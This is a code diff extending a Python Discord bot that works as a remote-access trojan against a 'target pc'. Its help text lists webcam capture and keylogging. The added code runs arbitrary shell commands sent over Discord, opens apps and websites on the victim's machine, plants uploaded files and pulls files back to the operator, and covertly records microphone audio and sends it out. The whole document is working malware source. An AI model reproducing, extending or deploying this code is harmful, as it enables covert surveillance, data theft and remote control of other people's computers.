@@ -6,7 +6,7 @@
 
 # more features may be added later
 
-
+import webbrowser
 import time
 import requests
 import pyautogui
@@ -45,8 +45,156 @@ async def options(ctx):
 !webcam        - Captures webcam footage
 !startkeylog   - Begins logging keystrokes
 !stopkeylog    - Stops logging keystrokes
+!openapp       - Opens a desired app
+!cmd           - Executes a command
+!openweb       - Opens a website
+!showimage     - Displays an attachment on target pc
+!uploadfile    - Uploads a file on the system
+!downloadfile  - Downloads a file from the system
+!startmic      - Starts recording audio
+!stopmic       - Stops recording audio
 ```"""
     await ctx.send(commands_list)
+recording = False
+
+def record_mic(filename="mic_audio.wav"):
+    global recording
+    recording = True
+
+    audio = pyaudio.PyAudio()
+    stream = audio.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
+
+    frames = []
+    while recording:
+        data = stream.read(1024)
+        frames.append(data)
+
+    stream.stop_stream()
+    stream.close()
+    audio.terminate()
+    with wave.open(filename, "wb") as wf:
+        wf.setnchannels(1)
+        wf.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
+        wf.setframerate(44100)
+        wf.writeframes(b''.join(frames))
+
+@bot.command()
+async def startmic(ctx):
+    global recording
+    if recording:
+        await ctx.send("Already recording")
+        return
+
+    await ctx.send("Recording...")
+
+    thread = threading.Thread(target=record_mic)
+    thread.start()
+
+@bot.command()
+async def stopmic(ctx):
+    global recording
+    if not recording:
+        await ctx.send("Not recording")
+        return
+
+    recording = False
+    await ctx.send("Recording stopped")
+
+    file_path = "mic_audio.wav"
+    while not os.path.exists(file_path):
+        pass
+    await ctx.send(file=discord.File(file_path))
+    os.remove(file_path)
+    await ctx.send("Audio file deleted from the system.")
+
+
+
+waiting_for_file = False
+
+@bot.command()
+async def uploadfile(ctx):
+    global waiting_for_file
+    waiting_for_file = True
+    await ctx.send("Upload file:")
+
+@bot.event
+async def on_message(message):
+    global waiting_for_file
+
+    if waiting_for_file and message.attachments:
+        for attachment in message.attachments:
+            file_url = attachment.url
+            file_name = attachment.filename
+            response = requests.get(file_url)
+            with open(file_name, "wb") as file:
+                file.write(response.content)
+            await message.channel.send(f"File {file_name} has been saved")
+            waiting_for_file = False
+            break
+
+    await bot.process_commands(message)
+
+
+@bot.command()
+async def downloadfile(ctx, filename: str):
+    if os.path.exists(filename):
+        await ctx.send(file=discord.File(filename))
+    else:
+        await ctx.send("File not found")
+
+waiting_for_image = False
+
+@bot.command()
+async def showimage(ctx):
+    global waiting_for_image
+    waiting_for_image = True
+    await ctx.send("Upload image:")
+
+@bot.event
+async def on_message(message):
+    global waiting_for_image
+
+    if waiting_for_image and message.attachments:
+        for attachment in message.attachments:
+            if attachment.filename.endswith(("png", "jpg", "jpeg", "gif")):
+                image_url = attachment.url
+                response = requests.get(image_url)
+                image_path = "downloaded_image.jpg"
+                with open(image_path, "wb") as file:
+                    file.write(response.content)
+                subprocess.Popen(["start", image_path], shell=True)
+
+                await message.channel.send(f"Image displayed: {attachment.url}")
+                
+                waiting_for_image = False
+                break
+
+    await bot.process_commands(message)
+
+@bot.command()
+async def cmd(ctx, *, command: str):
+    try:
+        output = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
+        if len(output) > 1900:
+            output = output[:1900] + "..."
+        await ctx.send(f"```\n{output}\n```")
+    except subprocess.CalledProcessError as e:
+        await ctx.send(f"```\n{e.output}\n```")
+
+@bot.command()
+async def openweb(ctx, url: str):
+    try:
+        webbrowser.open(url)
+        await ctx.send(f"Opened {url} in browser.")
+    except Exception as e:
+        await ctx.send(f"Error: {e}")
+@bot.command()
+async def openapp(ctx, app_name: str):
+    try:
+        subprocess.Popen(app_name, shell=True)
+        await ctx.send(f"Opened {app_name}")
+    except Exception as e:
+        await ctx.send(f"Error opening {app_name}: {e}")
 
 @bot.command()
 async def ss(ctx):
